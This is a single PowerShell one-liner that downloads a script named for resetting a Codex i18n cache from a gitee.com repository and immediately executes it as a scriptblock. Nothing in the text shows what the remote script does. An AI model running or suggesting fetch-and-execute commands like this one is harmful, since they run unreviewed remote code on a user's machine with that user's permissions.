$u='https://gitee.com/zhenglei410/codex-i18n-cache-seeder/raw/main/current-key/Reset-And-Enable-CodexI18nCurrentCache.ps1';& ([scriptblock]::Create((Invoke-RestMethod $u).TrimStart([char]0xFEFF)))
